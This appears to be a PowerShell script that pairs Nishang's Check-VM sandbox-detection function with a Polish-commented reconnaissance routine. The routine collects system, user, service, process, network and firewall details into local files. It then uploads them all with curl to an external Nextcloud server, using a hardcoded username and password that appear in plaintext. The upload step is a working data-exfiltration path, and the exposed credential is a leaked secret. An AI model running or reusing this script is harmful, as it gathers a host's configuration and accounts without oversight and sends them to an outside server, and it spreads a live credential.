

function Check-VM
{

<# 
.SYNOPSIS 
Nishang script which detects whether it is in a known virtual machine.
 
.DESCRIPTION 
This script uses known parameters or 'fingerprints' of Hyper-V, VMWare, Virtual PC, Virtual Box,
Xen and QEMU for detecting the environment.

.EXAMPLE 
PS > Check-VM
 
.LINK 
http://www.labofapenetrationtester.com/2013/01/quick-post-check-if-your-payload-is.html
https://github.com/samratashok/nishang

.NOTES 
The script draws heavily from checkvm.rb post module from msf.
https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/checkvm.rb
#> 
    [CmdletBinding()] Param()
    $ErrorActionPreference = "SilentlyContinue"
    #Hyper-V
    $hyperv = Get-ChildItem HKLM:\SOFTWARE\Microsoft
    if (($hyperv -match "Hyper-V") -or ($hyperv -match "VirtualMachine"))
        {
            $hypervm = $true
        }

    if (!$hypervm)
        {
            $hyperv = Get-ItemProperty hklm:\HARDWARE\DESCRIPTION\System -Name SystemBiosVersion
            if ($hyperv -match "vrtual")
                {
                    $hypervm = $true
                }
        }
    
    if (!$hypervm)
        {
            $hyperv = Get-ChildItem HKLM:\HARDWARE\ACPI\FADT
            if ($hyperv -match "vrtual")
                {
                    $hypervm = $true
                }
        }
            
    if (!$hypervm)
        {
            $hyperv = Get-ChildItem HKLM:\HARDWARE\ACPI\RSDT
            if ($hyperv -match "vrtual")
                {
                    $hypervm = $true
                }
        }

    if (!$hypervm)
        {
            $hyperv = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
            if (($hyperv -match "vmicheartbeat") -or ($hyperv -match "vmicvss") -or ($hyperv -match "vmicshutdown") -or ($hyperv -match "vmiexchange"))
                {
                    $hypervm = $true
                }
        }
   
    if ($hypervm)
        {
    
             "This is a Hyper-V machine."
    
        }

    #VMWARE

    $vmware = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
    if (($vmware -match "vmdebug") -or ($vmware -match "vmmouse") -or ($vmware -match "VMTools") -or ($vmware -match "VMMEMCTL"))
        {
            $vmwarevm = $true
        }

    if (!$vmwarevm)
        {
            $vmware = Get-ItemProperty hklm:\HARDWARE\DESCRIPTION\System\BIOS -Name SystemManufacturer
            if ($vmware -match "vmware")
                {
                    $vmwarevm = $true
                }
        }
    
    if (!$vmwarevm)
        {
            $vmware = Get-Childitem hklm:\hardware\devicemap\scsi -recurse | gp -Name identifier
            if ($vmware -match "vmware")
                {
                    $vmwarevm = $true
                }
        }

    if (!$vmwarevm)
        {
            $vmware = Get-Process
            if (($vmware -eq "vmwareuser.exe") -or ($vmware -match "vmwaretray.exe"))
                {
                    $vmwarevm = $true
                }
        }

    if ($vmwarevm)
        {
    
             "This is a VMWare machine."
    
        }
    
    #Virtual PC

    $vpc = Get-Process
    if (($vpc -eq "vmusrvc.exe") -or ($vpc -match "vmsrvc.exe"))
        {
        $vpcvm = $true
        }

    if (!$vpcvm)
        {
            $vpc = Get-Process
            if (($vpc -eq "vmwareuser.exe") -or ($vpc -match "vmwaretray.exe"))
                {
                    $vpcvm = $true
                }
        }

    if (!$vpcvm)
        {
            $vpc = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
            if (($vpc -match "vpc-s3") -or ($vpc -match "vpcuhub") -or ($vpc -match "msvmmouf"))
                {
                    $vpcvm = $true
                }
        }

    if ($vpcvm)
        {
    
         "This is a Virtual PC."
    
        }


    #Virtual Box

    $vb = Get-Process
    if (($vb -eq "vboxservice.exe") -or ($vb -match "vboxtray.exe"))
        {
    
        $vbvm = $true
    
        }
    if (!$vbvm)
        {
            $vb = Get-ChildItem HKLM:\HARDWARE\ACPI\FADT
            if ($vb -match "vbox_")
                {
                    $vbvm = $true
                }
        }

    if (!$vbvm)
        {
            $vb = Get-ChildItem HKLM:\HARDWARE\ACPI\RSDT
            if ($vb -match "vbox_")
                {
                    $vbvm = $true
                }
        }

    
    if (!$vbvm)
        {
            $vb = Get-Childitem hklm:\hardware\devicemap\scsi -recurse | gp -Name identifier
            if ($vb -match "vbox")
                {
                    $vbvm = $true
                }
        }



    if (!$vbvm)
        {
            $vb = Get-ItemProperty hklm:\HARDWARE\DESCRIPTION\System -Name SystemBiosVersion
            if ($vb -match "vbox")
                {
                     $vbvm = $true
                }
        }
  

    if (!$vbvm)
        {
            $vb = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
            if (($vb -match "VBoxMouse") -or ($vb -match "VBoxGuest") -or ($vb -match "VBoxService") -or ($vb -match "VBoxSF"))
                {
                    $vbvm = $true
                }
        }

    if ($vbvm)
        {
    
         "This is a Virtual Box."
    
        }



    #Xen

    $xen = Get-Process

    if ($xen -eq "xenservice.exe")
        {
    
        $xenvm = $true
    
        }
    
    if (!$xenvm)
        {
            $xen = Get-ChildItem HKLM:\HARDWARE\ACPI\FADT
            if ($xen -match "xen")
                {
                    $xenvm = $true
                }
        }

    if (!$xenvm)
        {
            $xen = Get-ChildItem HKLM:\HARDWARE\ACPI\DSDT
            if ($xen -match "xen")
                {
                    $xenvm = $true
                }
        }
    
    if (!$xenvm)
        {
            $xen = Get-ChildItem HKLM:\HARDWARE\ACPI\RSDT
            if ($xen -match "xen")
                {
                    $xenvm = $true
                }
        }

    
    if (!$xenvm)
        {
           $xen = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
            if (($xen -match "xenevtchn") -or ($xen -match "xennet") -or ($xen -match "xennet6") -or ($xen -match "xensvc") -or ($xen -match "xenvdb"))
                {
                    $xenvm = $true
                }
        }


    if ($xenvm)
        {
    
         "This is a Xen Machine."
    
        }


    #QEMU

    $qemu = Get-Childitem hklm:\hardware\devicemap\scsi -recurse | gp -Name identifier
    if ($qemu -match "qemu")
        {
    
            $qemuvm = $true
    
        }
    
    if (!$qemuvm)
        {
        $qemu = Get-ItemProperty hklm:HARDWARE\DESCRIPTION\System\CentralProcessor\0 -Name ProcessorNameString
        if ($qemu -match "qemu")
            {
                $qemuvm = $true
            }
        }    

    if ($qemuvm)
        {
    
         "This is a Qemu machine."
    
        }
}

##CheckVM

# Katalog na lokalnym systemie
$OutputDir = "VM_Config_Info"
if (-not (Test-Path $OutputDir)) {
    New-Item -Path $OutputDir -ItemType Directory
}

# Pobieranie informacji o systemie
Get-ComputerInfo | Out-File "$OutputDir\ComputerInfo.txt"
Get-WmiObject -Class Win32_Processor | Select-Object Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed | Out-File "$OutputDir\ProcessorInfo.txt"
Get-WmiObject -Class Win32_PhysicalMemory | Select-Object Manufacturer, Capacity, Speed | Out-File "$OutputDir\MemoryInfo.txt"
Get-WmiObject -Class Win32_DiskDrive | Select-Object Model, Size, MediaType | Out-File "$OutputDir\DiskInfo.txt"
Get-NetAdapter | Select-Object Name, InterfaceDescription, Status, MacAddress, LinkSpeed | Out-File "$OutputDir\NetworkAdapterInfo.txt"
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Out-File "$OutputDir\InstalledPrograms.txt"
Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name, DisplayName, Status | Out-File "$OutputDir\RunningServices.txt"
Get-Process | Select-Object Name, Id, CPU, WS | Out-File "$OutputDir\RunningProcesses.txt"
Get-LocalUser | Out-File "$OutputDir\LocalUsers.txt"
Get-LocalGroup | Out-File "$OutputDir\LocalGroups.txt"
Get-NetIPAddress | Select-Object IPAddress, InterfaceAlias, AddressFamily, PrefixLength | Out-File "$OutputDir\NetworkInfo.txt"
Get-NetFirewallProfile | Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction | Out-File "$OutputDir\FirewallSettings.txt"
(Get-CimInstance -ClassName win32_operatingsystem).LastBootUpTime | Out-File "$OutputDir\Uptime.txt"
try {
    Import-Module -Name PSWindowsUpdate -ErrorAction Stop
    Get-WindowsUpdate | Out-File "$OutputDir\WindowsUpdateInfo.txt"
} catch {
    Write-Output "PSWindowsUpdate module is not installed. Skipping Windows Update info." | Out-File "$OutputDir\WindowsUpdateInfo.txt"
}
$PSVersionTable | Out-File "$OutputDir\PSVersion.txt"
Get-WmiObject -Class Win32_ComputerSystem | Select-Object Manufacturer, Model | Out-File "$OutputDir\VirtualizationInfo.txt"
Write-Output "Script execution completed. Check the $OutputDir directory for output files."

# Ustawienia Nextcloud
$NextcloudURL = "https://cloud.juniorjpdj.pl/remote.php/dav/files/zordonbot/Data"
$NextcloudUser = "zordonbot"
$NextcloudPassword = "t8RLr-4ps3x-qJonD-7RF9r-5W55C"

# Ścieżka do cURL.exe - upewnij się, że masz cURL zainstalowany
$curlPath = "C:\Windows\System32\curl.exe"  # lub ścieżka do cURL, jeśli jest zainstalowany w innym miejscu

# Funkcja do przesyłania plików na Nextcloud za pomocą cURL
function Upload-ToNextcloud {
    param (
        [string]$filePath,
        [string]$nextcloudURL,
        [string]$nextcloudUser,
        [string]$nextcloudPassword
    )

    $fileName = [System.IO.Path]::GetFileName($filePath)
    $uploadUrl = "$nextcloudURL/$fileName"

    # Użycie pełnej ścieżki do cURL
    & $curlPath -u ${nextcloudUser}:${nextcloudPassword} -T $filePath $uploadUrl -v
}

# Przesyłanie plików na Nextcloud
$files = Get-ChildItem -Path $OutputDir
foreach ($file in $files) {
    Upload-ToNextcloud -filePath $file.FullName -nextcloudURL $NextcloudURL -nextcloudUser $NextcloudUser -nextcloudPassword $NextcloudPassword
}

Write-Output "All files uploaded to Nextcloud."

